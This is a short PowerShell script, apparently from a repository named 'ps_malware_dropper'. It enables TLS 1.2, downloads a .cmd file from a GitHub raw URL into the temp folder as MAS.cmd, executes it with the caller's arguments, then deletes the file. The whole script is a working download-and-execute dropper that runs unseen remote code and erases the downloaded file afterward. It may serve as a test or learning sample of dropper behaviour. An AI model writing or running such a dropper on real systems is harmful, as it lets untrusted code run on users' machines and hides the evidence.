# Enable TLSv1.2 for compatibility with older clients
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
Write-Output "Assertion 1"
$DownloadURL = 'https://raw.githubusercontent.com/RaviNayyar/ps_malware_dropper/main/test.cmd'

$FilePath = "$env:TEMP\MAS.cmd"
$ScriptArgs = "$args "
Write-Output $FilePath

Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $FilePath -ErrorAction Stop

if (Test-Path $FilePath) {
    Write-Output "Assertion 2"   
    Start-Process $FilePath $ScriptArgs -Wait
    $item = Get-Item -LiteralPath $FilePath
    $item.Delete()
}
